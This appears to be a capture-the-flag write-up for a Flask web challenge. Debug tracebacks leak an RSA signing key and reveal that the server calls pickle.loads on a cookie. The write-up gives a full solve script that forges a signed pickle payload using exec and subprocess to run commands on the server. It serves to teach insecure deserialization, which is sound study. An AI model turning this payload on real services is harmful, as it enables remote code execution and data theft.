# EnFlaskCom

This challenge seems to be a simple web service. When loading the page, it tells you:
```
Flag is at /flag. Don't bother with a reverse shell.
```

We can check /flag, which tells you `You need to be admin`.

If we open Dev tools, we notice that two cookies are being set. The cookies are 'signature' and 'user.'

If we modify either the signature or the user, and reload the `/flag` page, Debug information pops up! The developer didn't disable tracebacks on errors.

We see some code around where the exception is raised. Notably, we see the line:
```python
user = pickle.loads(binascii.unhexlify(request.cookies.get("user")))
```

Deseriazing user-controlled objects is very dangerous in Python, and we can get code execution on the server if we can control our argument.

Now we want to figure out what the `sign` function is, to see if there is a way we can potentially break the signature.

The function `sign` is called on the argument of `request.cookies.get("user")`. Perhaps we can make that return a malformed or incorrect value, which will break the signature. Setting user to non-hex doesn't work, but `.get` will return None if the cookie doesn't exist. When we delete the cookie, we get a different error! A TypeError.

When we look at the code around the error, the RSA key used to sign the message is visible, in addition to the full implementation of the sign method!

We can use this to forge our own `user` value.

Now we just need to craft the correct object to unpickle, by defining the `reduce` method to something malicious. One way to exfiltrate data will be to raise an exception with the flag in it.

The class we will pickle is:
```python
class User:
    def __reduce__(self):
        return exec, ("import subprocess; raise Exception(subprocess.check_output(['cat', 'flag.txt']));",)
```

A full solve implementation is:

```python
import requests
import pickle
import binascii
from Crypto.Signature import pkcs1_15
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA384


def sign(msg):
    if type(msg) is not bytes:
        msg = bytes(msg, 'utf8')
    keyPair = RSA.RsaKey(n=122929120347181180506630461162876206124588624246894159983930957362668455150316050033925361228333120570604695808166534050128069551994951866012400864449036793525176147906281580860150210721340627722872013368881325479371258844614688187593034753782177752358596565495566940343979199266441125486268112082163527793027, e=65537, d=51635782679667624816161506479122291839735385241628788060448957989505448336137988973540355929843726591511533462854760404030556214994476897684092607183504108409464544455089663435500260307179424851133578373222765508826806957647307627850137062790848710572525309996924372417099296184433521789646380579144711982601, p=9501029443969091845314200516854049131202897408079558348265027433645537138436529678958686186818098288199208700604454521018557526124774944873478107311624843, q=12938505355881421667086993319210059247524615565536125368076469169929690129440969655350679337213760041688434152508579599794889156578802099893924345843674089, u=3286573208962127166795043977112753146960511781843430267174815026644571470787675370042644248296438692308614275464993081581475202509588447127488505764805156)
    signer = pkcs1_15.new(keyPair)
    hsh = SHA384.new()
    hsh.update(msg)
    signature = signer.sign(hsh)

    return signature


class User:
    def __reduce__(self):
        return exec, ("import subprocess; raise Exception(subprocess.check_output(['cat', 'flag.txt']));",)


user = binascii.hexlify(pickle.dumps(User()))
signature = binascii.hexlify(sign(user))

cookies = dict(signature=str(signature, 'utf8'), user=str(user, 'utf8'))

r = requests.get('http://localhost:5000/flag', cookies=cookies)

print(r.text)
```
